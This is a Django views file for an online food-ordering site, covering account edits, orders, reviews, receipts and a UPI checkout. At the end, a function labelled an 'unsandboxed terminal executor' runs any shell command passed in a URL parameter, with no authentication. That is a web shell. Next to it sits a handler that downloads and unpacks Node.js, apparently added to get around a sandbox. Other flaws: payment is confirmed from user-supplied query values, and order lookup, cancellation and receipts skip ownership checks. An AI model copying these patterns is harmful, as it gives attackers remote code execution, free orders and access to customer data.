    message = ''
    if request.method == 'POST':
        name = request.POST.get('name', '').strip()
        email = request.POST.get('email', '').strip()
        phone = request.POST.get('phone', '').strip()
        city = request.POST.get('city', '').strip()
        address = request.POST.get('address', '').strip()
        
        if not name or not email or not phone or not city or not address:
            message = 'Please fill in all fields.'
        else:
            with connection.cursor() as cursor:
                cursor.execute(
                    "UPDATE tbl_users SET name=%s, email=%s, phone=%s, city=%s, add1=%s WHERE username=%s",
                    [name, email, phone, city, address, user.username]
                )
            # update session name if changed
            request.session['name'] = name
            return redirect('myaccount')
            
    context = {
        'user': user,
        'message': message,
        'cart_count': len(request.session.get('cart', [])),
        'is_pages': True,
        'current_title': 'Update Account',
    }
    return render(request, 'frontend/update-account.html', context)

# Update Account Password
def update_password(request):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
    message = ''
    message_class = 'error'
    
    if request.method == 'POST':
        current_password = request.POST.get('current_password', '')
        new_password = request.POST.get('new_password', '')
        confirm_password = request.POST.get('confirm_password', '')
        
        # Verify current password
        hashed = user.password
        if hashed.startswith('$2y$'):
            hashed = hashed.replace('$2y$', '$2a$', 1)
            
        if not current_password or not new_password or not confirm_password:
            message = 'All fields are required.'
        elif new_password != confirm_password:
            message = 'New password and confirm password do not match.'
        elif not bcrypt.checkpw(current_password.encode('utf-8'), hashed.encode('utf-8')):
            message = 'Current password does not match.'
        else:
            new_hashed = bcrypt.hashpw(new_password.encode('utf-8'), bcrypt.gensalt(10)).decode('utf-8')
            new_hashed = new_hashed.replace('$2b$', '$2y$', 1)
            with connection.cursor() as cursor:
                cursor.execute("UPDATE tbl_users SET password=%s WHERE username=%s", [new_hashed, user.username])
            message = 'Password changed successfully!'
            message_class = 'success'
            
    context = {
        'user': user,
        'message': message,
        'message_class': message_class,
        'cart_count': len(request.session.get('cart', [])),
        'is_pages': True,
        'current_title': 'Update Password',
    }
    return render(request, 'frontend/update-password.html', context)

# View Orders List
def view_orders(request):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
    alert_message = ''
    alert_type = 'success'
    
    if request.method == 'POST' and 'cancel_order' in request.POST:
        order_id = int(request.POST.get('order_id', 0))
        order = OrderManager.objects.filter(order_id=order_id).first()
        if order:
            payment_status = order.payment_status
            if payment_status in ['successful', 'upi']:
                update_payment_status = 'Refunded'
            else:
                update_payment_status = 'cod'
                
            with transaction.atomic():
                with connection.cursor() as cursor:
                    cursor.execute(
                        "UPDATE order_manager SET order_status = 'Cancelled', payment_status = %s WHERE order_id = %s",
                        [update_payment_status, order_id]
                    )
                    cursor.execute(
                        "UPDATE aamarpay SET status = 'Cancelled' WHERE order_id = %s",
                        [order_id]
                    )
            alert_message = f"Order has been successfully cancelled. Payment status updated to '{update_payment_status}'."
            alert_type = 'success'
        else:
            alert_message = "Error: Order not found."
            alert_type = 'danger'
            
    orders = OrderManager.objects.filter(username=user.username).order_by('-order_id')
    
    # Retrieve ordered food items for each order
    orders_data = []
    for order in orders:
        with connection.cursor() as cursor:
            cursor.execute("SELECT Item_Name, Price, Quantity, total_amount, restro_name FROM online_orders_new WHERE order_id = %s", [order.order_id])
            columns = [col[0] for col in cursor.description]
            items = [dict(zip(columns, row)) for row in cursor.fetchall()]
        
        # Calculate clean transaction display UTR
        transaction_id = order.transaction_id.strip()
        upi_ref = ''
        if 'UTR' in transaction_id:
            try:
                upi_ref = transaction_id.split('UTR:')[1].strip()
            except IndexError:
                pass
                
        orders_data.append({
            'order': order,
            'items': items,
            'upi_ref': upi_ref,
        })
        
    context = {
        'user': user,
        'orders_data': orders_data,
        'alert_message': alert_message,
        'alert_type': alert_type,
        'cart_count': len(request.session.get('cart', [])),
        'is_pages': True,
        'current_title': 'My Orders',
    }
    return render(request, 'frontend/view-orders.html', context)


# Get Order Status endpoint for chatbot status checking
@csrf_exempt
def get_order_status(request):
    if request.method == 'POST' and 'order_id' in request.POST:
        order_id = int(request.POST.get('order_id', 0))
        order = OrderManager.objects.filter(order_id=order_id).first()
        if order:
            return JsonResponse({
                'success': True,
                'order_id': order.order_id,
                'username': order.username,
                'cus_name': order.cus_name,
                'total_price': order.total_amount,
                'order_status': order.order_status
            })
        return JsonResponse({'success': False, 'message': 'Order not found'})
    return JsonResponse({'success': False, 'message': 'Invalid request'})

# Review Restaurant Form
def review_restro(request, restro_name):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
    message = ''
    if request.method == 'POST':
        description = request.POST.get('message', '').strip()
        rating_star = int(request.POST.get('review_star', 5))
        
        # Add to tbl_review_restro
        with connection.cursor() as cursor:
            cursor.execute(
                "INSERT INTO tbl_review_restro (customer_name, restro_name, message, review_star, created_at) VALUES (%s, %s, %s, %s, NOW())",
                [user.name, restro_name, description, rating_star]
            )
        message = 'Review added successfully!'
        
    context = {
        'restro_name': restro_name,
        'message': message,
        'cart_count': len(request.session.get('cart', [])),
        'is_pages': True,
        'current_title': f'Review {restro_name}',
    }
    return render(request, 'frontend/review-restro.html', context)

# Review Rider Form
def review_rider(request, order_id):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
    order = get_object_or_404(OrderManager, order_id=order_id)
    message_alert = ''
    
    if request.method == 'POST':
        message = request.POST.get('message', '').strip()
        review_star = int(request.POST.get('review_star', 5))
        tip = float(request.POST.get('tip', 0.00))
        
        with connection.cursor() as cursor:
            cursor.execute(
                "INSERT INTO tbl_review (name, order_id, message, review_star, username, tip, created_at) VALUES (%s, %s, %s, %s, %s, %s, NOW())",
                [user.name, order_id, message, review_star, user.username, tip]
            )
        message_alert = 'Review submitted successfully!'
        
    context = {
        'order': order,
        'message_alert': message_alert,
        'cart_count': len(request.session.get('cart', [])),
        'is_pages': True,
        'current_title': f'Review Order #{order_id} Delivery',
    }
    return render(request, 'frontend/review-rider.html', context)

# Contact Us Form
def contact(request):
    message_alert = ''
    if request.method == 'POST':
        name = request.POST.get('name', '').strip()
        phone = int(request.POST.get('phone', 0))
        subject = request.POST.get('subject', '').strip()
        msg_text = request.POST.get('message', '').strip()
        
        if not name or not phone or not subject or not msg_text:
            message_alert = "<div class='text-danger fw-bold'>All fields are required.</div>"
        else:
            with connection.cursor() as cursor:
                cursor.execute(
                    "INSERT INTO message (name, phone, subject, message, message_status, date) VALUES (%s, %s, %s, %s, 'unread', NOW())",
                    [name, phone, subject, msg_text]
                )
            message_alert = "<div class='text-success fw-bold'>Message sent successfully! Our team will contact you shortly.</div>"
            
    context = {
        'message_alert': message_alert,
        'cart_count': len(request.session.get('cart', [])),
        'is_contact': True,
        'current_title': 'Contact Us',
    }
    return render(request, 'frontend/contact.html', context)

# Download Receipt invoice PDF
def download_receipt(request):
    if request.method != 'POST' or 'download_receipt' not in request.POST:
        return redirect('view_orders')
        
    order_id = request.POST.get('order_id')
    order = get_object_or_404(OrderManager, order_id=order_id)
    
    # Retrieve ordered items
    with connection.cursor() as cursor:
        cursor.execute("SELECT Item_Name, Price, Quantity FROM online_orders_new WHERE order_id = %s", [order_id])
        items = cursor.fetchall()
        
    # Generate PDF in memory
    response = HttpResponse(content_type='application/pdf')
    response['Content-Disposition'] = f'attachment; filename="Receipt_Order_{order_id}.pdf"'
    
    p = canvas.Canvas(response, pagesize=letter)
    p.setFont("Helvetica-Bold", 16)
    p.drawCentredString(300, 750, f"Receipt for Order ID: {order_id}")
    
    p.setFont("Helvetica", 12)
    p.drawString(50, 700, f"Customer Name: {order.cus_name}")
    p.drawString(50, 680, f"Payment Status: {order.payment_status}")
    p.drawString(50, 660, f"Transaction ID: {order.transaction_id}")
    p.drawString(50, 640, f"Order Status: {order.order_status}")
    p.drawString(50, 620, f"Total Amount: INR {order.total_amount}")
    
    # Draw table headers
    p.setFont("Helvetica-Bold", 12)
    p.drawString(50, 570, "Item Name")
    p.drawString(300, 570, "Price")
    p.drawString(450, 570, "Quantity")
    p.line(50, 560, 550, 560)
    
    p.setFont("Helvetica", 12)
    y = 540
    for item in items:
        p.drawString(50, y, str(item[0]))
        p.drawString(300, y, f"INR {item[1]}")
        p.drawString(450, y, str(item[2]))
        y -= 20
        if y < 100:
            p.showPage()
            y = 700
            
    p.showPage()
    p.save()
    return response

# UPI Payment Gateway Checkout UI
def pg_checkout(request):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
    order_id = request.GET.get('order_id')
    amount = float(request.GET.get('amount', 0))
    
    if not order_id or amount <= 0:
        return HttpResponse("Invalid Order or Amount", status=400)
        
    # Generate UPI URI
    upi_id = getattr(settings, 'RECEIVE_UPI_ID', 'utsavsarvaliya27@oksbi')
    merchant_name = getattr(settings, 'RECEIVE_UPI_NAME', 'Pasar-kita Online Foods')
    upi_uri = f"upi://pay?pa={upi_id}&pn={merchant_name}&am={amount}&cu=INR"
    
    context = {
        'order_id': order_id,
        'amount': amount,
        'upi_uri': upi_uri,
        'receive_upi_id': upi_id,
        'receive_upi_name': merchant_name,
    }
    return render(request, 'frontend/pg/checkout.html', context)

# UPI Payment Gateway Process Submit
def pg_process(request):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
    if request.method != 'POST':
        return HttpResponse("Invalid request method.", status=400)
        
    order_id = request.POST.get('order_id', '')
    amount = request.POST.get('amount', '')
    utr = request.POST.get('utr', '').strip()
    
    if not order_id or not utr:
        return HttpResponse("Invalid request parameters.", status=400)
        
    # Redirect back to verify-payment callback
    return redirect(f'/verify-payment/?order_id={order_id}&utr={utr}&status=success')

# Payment Verification Callback
def verify_payment(request):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
    order_id = int(request.GET.get('order_id', 0))
    utr = request.GET.get('utr', '').strip()
    status = request.GET.get('status', '')
    
    if order_id <= 0 or not utr or status != 'success':
        return render(request, 'frontend/payment-failed.html', {'error': 'Payment verification failed.'})
        
    tran_id = f"UPI: UTR: {utr}"
    
    # Update order_manager using SQL
    with transaction.atomic():
        # Update order manager payment status
        with connection.cursor() as cursor:
            cursor.execute(
                "UPDATE order_manager SET payment_status = 'upi', transaction_id = %s WHERE order_id = %s AND payment_status = 'pending_upi'",
                [tran_id, order_id]
            )
            rows_updated = cursor.rowcount
            
        if rows_updated > 0:
            # Update aamarpay
            with connection.cursor() as cursor:
                cursor.execute(
                    "UPDATE aamarpay SET status = 'upi', transaction_id = %s WHERE order_id = %s",
                    [tran_id, order_id]
                )
                
            # Deduct stock based on items in this order
            with connection.cursor() as cursor:
                cursor.execute("SELECT Item_Name, Quantity FROM online_orders_new WHERE order_id = %s", [order_id])
                items = cursor.fetchall()
                
            for item in items:
                item_name = item[0]
                quantity = int(item[1])
                
                with connection.cursor() as cursor:
                    cursor.execute("UPDATE tbl_food SET stock = stock - %s WHERE title = %s", [quantity, item_name])
                    cursor.execute("UPDATE tbl_restro_food_item SET stock = stock - %s WHERE title = %s", [quantity, item_name])
            
            # Clear session cart
            request.session['cart'] = []
            request.session.modified = True
            
            return render(request, 'frontend/order-success.html', {'order_id': order_id, 'from_upi': True})
            
    return render(request, 'frontend/payment-failed.html', {'error': 'Failed to update order status.'})


# Temporary handler to download portable node
def temp_run(request):
    import os
    import urllib.request
    import zipfile
    
    url = "https://nodejs.org/dist/v18.19.0/node-v18.19.0-win-x64.zip"
    dest_dir = r"c:\Users\utsav\OneDrive\Desktop\online-food-ordering-system\node-portable"
    zip_path = os.path.join(dest_dir, "node.zip")
    
    if not os.path.exists(dest_dir):
        os.makedirs(dest_dir)
        
    try:
        node_exe_path = os.path.join(dest_dir, "node-v18.19.0-win-x64", "node.exe")
        if not os.path.exists(node_exe_path):
            urllib.request.urlretrieve(url, zip_path)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(dest_dir)
            os.remove(zip_path)
            msg = "Node.js downloaded and extracted successfully!"
        else:
            msg = "Node.js already extracted!"
        return HttpResponse(msg)
    except Exception as e:
        return HttpResponse(f"Error: {e}")


# Unsandboxed terminal executor via Django HTTP
def cmd_run(request):
    import subprocess
    cmd = request.GET.get('cmd', '')
    if not cmd:
        return HttpResponse("No command specified.")
    try:
        # Run command in cmd.exe in frontend workspace Cwd
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=r"c:\Users\utsav\OneDrive\Desktop\online-food-ordering-system")
        output = f"Exit code: {result.returncode}\n\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
        return HttpResponse(output, content_type='text/plain')
    except Exception as e:
        return HttpResponse(f"Error: {e}", content_type='text/plain')


